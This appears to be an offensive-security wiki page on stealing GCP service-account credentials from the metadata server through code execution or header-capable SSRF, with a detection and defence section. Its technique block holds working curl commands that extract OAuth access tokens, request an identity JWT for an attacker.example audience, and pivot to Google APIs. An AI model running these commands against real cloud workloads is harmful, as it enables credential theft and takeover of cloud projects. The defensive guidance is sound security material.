---
title: GCP metadata token theft
slug: gcp-metadata-token-theft
---

> **TL;DR:** `metadata.google.internal` hands out OAuth access tokens and signed identity JWTs for the attached service account — any SSRF that can inject `Metadata-Flavor: Google` (or any code-exec on the host) drains them.

## What it is
Every GCE VM, GKE node, Cloud Run revision, Cloud Functions instance, and App Engine app exposes a metadata server at `metadata.google.internal` (also reachable as `169.254.169.254`). It returns the project ID, instance attributes, and — most importantly — an OAuth2 access token for the instance's default (or user-attached) service account, plus a Google-signed identity JWT for OIDC federation. The only header gate is `Metadata-Flavor: Google`, intended to defeat trivial SSRF from clients that cannot set arbitrary headers; once you can set it, the endpoint is unauthenticated.

## Preconditions / where it applies
- Code execution or header-capable SSRF inside a GCP workload with a service account attached.
- The service account holds non-trivial IAM bindings (default Compute SA historically had `Editor` on the project — still common in legacy projects).
- For GKE: Workload Identity may redirect token requests through `gke-metadata-server`, which enforces the KSA→GSA binding; without it, every pod inherits the node SA.

## Technique
```bash
H='Metadata-Flavor: Google'
BASE=http://metadata.google.internal/computeMetadata/v1

# Enumerate
curl -sH "$H" $BASE/project/project-id
curl -sH "$H" $BASE/instance/service-accounts/default/email
curl -sH "$H" $BASE/instance/service-accounts/default/scopes

# Steal an OAuth access token
TOK=$(curl -sH "$H" $BASE/instance/service-accounts/default/token | jq -r .access_token)

# Steal an OIDC identity JWT for federation to a third-party
curl -sH "$H" "$BASE/instance/service-accounts/default/identity?audience=https://attacker.example/oidc&format=full"

# Pivot — call any Google API the SA is allowed to hit
curl -sH "Authorization: Bearer $TOK" \
  https://cloudresourcemanager.googleapis.com/v1/projects
gcloud auth login --cred-file <(printf '{"access_token":"%s"}' "$TOK") 2>/dev/null
```

The v1beta1 path that allowed header-less retrieval was retired in 2020; modern SSRF must control headers (CRLF injection, template-engine header smuggling, or proxies that let the client set them).

## Detection and defence
- Enable Workload Identity on GKE and set node metadata mode to `GKE_METADATA` so the legacy endpoint is unreachable from pods.
- Avoid the default Compute Engine SA on new workloads; use a per-workload SA with least privilege and `--no-scopes` where possible.
- Cloud Audit Logs (Data Access + Admin Activity): alert on access-token mints followed by anomalous high-priv API calls from a new caller IP.
- Block egress to attacker-controlled OIDC audiences via VPC Service Controls where federation is not expected.

## References
- [GCP — Storing and retrieving instance metadata](https://cloud.google.com/compute/docs/metadata/overview) — endpoint reference and header requirement.
- [GCP — Workload Identity](https://cloud.google.com/kubernetes-engine/docs/concepts/workload-identity) — KSA→GSA binding model.

See also: [[gcp-metadata-server]], [[gcp-service-account-enum]], [[gcp-iam-misconfig]], [[aws-imds-ssrf-pivot]], [[ssrf]].
